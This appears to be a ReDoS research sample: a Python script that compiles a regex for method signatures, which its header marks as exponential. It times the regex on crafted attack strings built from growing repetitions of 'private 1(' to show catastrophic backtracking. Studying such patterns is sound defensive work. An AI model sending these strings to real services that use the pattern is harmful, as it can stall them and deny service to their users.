# 1714
# (private|public|protected)\s\w(.)*\((.)*\)[^;]
# EXPONENT
# nums:4
# EXPONENT AttackString:""+"private 1("*512+"! _1SLQ_2;"

import re
from time import perf_counter

regex = """(private|public|protected)\s\w(.)*\((.)*\)[^;]"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "" + "private 1(" * i * 1 + "! _1SLQ_2;"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")